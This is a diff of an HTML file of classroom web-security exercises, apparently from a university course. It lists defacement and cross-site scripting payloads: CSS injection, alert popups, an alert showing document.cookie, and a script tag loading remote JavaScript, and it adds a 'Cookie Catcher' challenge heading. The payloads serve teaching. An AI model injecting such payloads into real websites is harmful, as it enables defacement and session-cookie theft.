@@ -1,6 +1,5 @@
 
 <!--Challenge 1: Site Defacing / HTML Injections-->
-
 <!--Set background Set the background to a different color-->
 <style>body { background-color: yellow; }</style>
 <!--Display another image on the website-->
@@ -9,7 +8,6 @@
 <a href="https://www.technikum-wien.at/" target="_blank">Click me</a>
 
 <!--Challenge 2: JavaScript / Cross Site Scripting-->
-
 <!--Popup: Display a message to the client-->
 <script>alert('Hello, this is an XSS Popup!');</script>
 <!--Redirect the client to some other website-->
@@ -17,4 +15,7 @@
 <!--Create a session with the server and display the current sesssion ID-->
 <script>alert(document.cookie);</script>
 <!--Try to load JS code from a different web source into the website-->
+<script src="https://www.technikum-wien.at/_next/static/chunks/pages/studium-017e8e814ae75b5f.js"></script>
 
+<!-- Challenge 3: Javascript / Cookie Catcher-->
+<!-- Write a "Cookie Catcher", Clientside: Javascript, Backend: PHP -->
